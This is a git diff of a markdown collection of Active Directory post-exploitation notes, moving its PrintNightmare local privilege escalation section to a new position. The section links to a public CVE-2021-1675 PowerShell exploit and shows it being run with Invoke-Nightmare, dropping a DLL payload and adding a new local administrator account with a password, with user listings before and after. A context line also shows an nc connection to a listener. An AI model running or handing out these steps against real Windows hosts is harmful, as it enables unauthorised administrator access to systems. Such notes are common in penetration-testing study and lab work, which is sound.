@@ -18,7 +18,6 @@ This is a collection of notes about active directory and (post)exploitation
     + [Powershell Download](#powershell-download)
     + [Read Local Sam Hashes](#read-local-sam-hashes)
     + [Powercat](#powercat)
-  * [Print nightmare LPE](#print-nightmare-lpe)
   * [Check smb version and server info](#check-smb-version-and-server-info)
     + [nmap](#nmap)
     + [metasploit](#metasploit)
@@ -56,6 +55,7 @@ This is a collection of notes about active directory and (post)exploitation
     + [psexec](#psexec)
   * [Pass the Hash](#pass-the-hash)
   * [Pass the Ticket](#pass-the-ticket)
+  * [Print nightmare LPE](#print-nightmare-lpe)
   * [Printer Bug](#printer-bug)
   * [Abusing ACL](#abusing-acl)
     + [GenericALL-User](#genericall-user)
@@ -360,43 +360,6 @@ connect from another device
 	┌──(kali㉿kali)-[~/Desktop]
 	└─$ nc 192.168.200.112 4444                                    
 	i connected from kali
-
-
-
-## Print nightmare LPE
-
-Download script from here : https://github.com/gyaansastra/Print-Nightmare-LPE
-
-check current users
-
-	PS C:\Users\testuser\Desktop\share> net user
-
-	User accounts for \\PC-WIN10
-
-	-------------------------------------------------------------------------------
-	Administrator            DefaultAccount           Guest
-	WDAGUtilityAccount       win10
-	The command completed successfully.
-
-
-import and execute script
-
-	PS C:\Users\testuser\Desktop\share> . .\CVE-2021-1675.ps1
-	PS C:\Users\testuser\Desktop\share> Invoke-Nightmare -NewUser nightmare -NewPassword "Pass123!" -DriverName "printme"
-	[+] created payload at C:\Users\win10\AppData\Local\Temp\nightmare.dll
-	[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_c62e9f8067f98247\Amd64\mxdwdrv.dll"
-	[+] added user nightmare as local administrator
-	[+] deleting payload from C:\Users\win10\AppData\Local\Temp\nightmare.dll
-	PS C:\Users\testuser\Desktop\share> net user
-
-	User accounts for \\PC-WIN10
-
-	-------------------------------------------------------------------------------
-	Administrator            DefaultAccount           Guest
-	nightmare                WDAGUtilityAccount       win10
-	The command completed successfully.
-
-	PS C:\Users\testuser\Desktop\share>
 
 ## Check smb version and server info
 
@@ -1384,6 +1347,43 @@ check you access
 
 
 ![image](https://user-images.githubusercontent.com/13157446/130322707-c5e5d93c-cf17-46f7-9b08-a675ec60a83d.png)
+
+
+
+## Print nightmare LPE
+
+Download script from here : https://github.com/gyaansastra/Print-Nightmare-LPE
+
+check current users
+
+	PS C:\Users\testuser\Desktop\share> net user
+
+	User accounts for \\PC-WIN10
+
+	-------------------------------------------------------------------------------
+	Administrator            DefaultAccount           Guest
+	WDAGUtilityAccount       win10
+	The command completed successfully.
+
+
+import and execute script
+
+	PS C:\Users\testuser\Desktop\share> . .\CVE-2021-1675.ps1
+	PS C:\Users\testuser\Desktop\share> Invoke-Nightmare -NewUser nightmare -NewPassword "Pass123!" -DriverName "printme"
+	[+] created payload at C:\Users\win10\AppData\Local\Temp\nightmare.dll
+	[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_c62e9f8067f98247\Amd64\mxdwdrv.dll"
+	[+] added user nightmare as local administrator
+	[+] deleting payload from C:\Users\win10\AppData\Local\Temp\nightmare.dll
+	PS C:\Users\testuser\Desktop\share> net user
+
+	User accounts for \\PC-WIN10
+
+	-------------------------------------------------------------------------------
+	Administrator            DefaultAccount           Guest
+	nightmare                WDAGUtilityAccount       win10
+	The command completed successfully.
+
+	PS C:\Users\testuser\Desktop\share>
 
 
 ## Printer Bug
